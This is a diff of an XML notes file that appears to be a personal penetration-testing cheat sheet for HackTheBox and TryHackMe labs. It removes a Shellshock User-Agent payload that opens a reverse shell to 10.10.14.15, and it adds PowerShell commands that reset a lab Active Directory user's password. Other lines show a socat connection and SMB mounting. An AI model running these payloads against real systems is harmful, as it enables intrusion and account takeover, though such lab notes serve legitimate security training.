@@ -375,7 +375,7 @@ Attacker:
       <rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
     </node>
   </node>
-  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1666013032">
+  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1673445436">
     <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1664800896">
       <rich_text>get hostname / pc name
 hostname
@@ -772,8 +772,26 @@ prompt OFF
 mget *</rich_text>
     </node>
   </node>
-  <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
-    <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
+  <node name="Active_Directory" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673445436" ts_lastsave="1673445614">
+    <rich_text weight="heavy">Set new password to sophie</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#bac8d4">PS C:\Users\phillip&gt; Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose  
+
+New Password: *********  
+
+VERBOSE: Performing the operation "Set-ADAccountPassword" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">Force Password Reset on next logon</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#bac8d4">PS C:\Users\phillip&gt; Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose  
+
+VERBOSE: Performing the operation "Set" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".</rich_text>
   </node>
   <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
     <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
@@ -935,7 +953,6 @@ dpkg -i &lt;package_file&gt;.deb</rich_text>
       <rich_text scale="h3">mount -t cifs \\\\10.10.11.174\\support-tools /mnt -o username=123,password=123</rich_text>
     </node>
   </node>
-  <node name="BloodHound" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666857630" ts_lastsave="1666857630"/>
   <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1663435801">
     <node name="SimpleHTTPServer" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394751" ts_lastsave="1655394754">
       <rich_text>python -m SimpleHTTPServer &lt;port&gt;
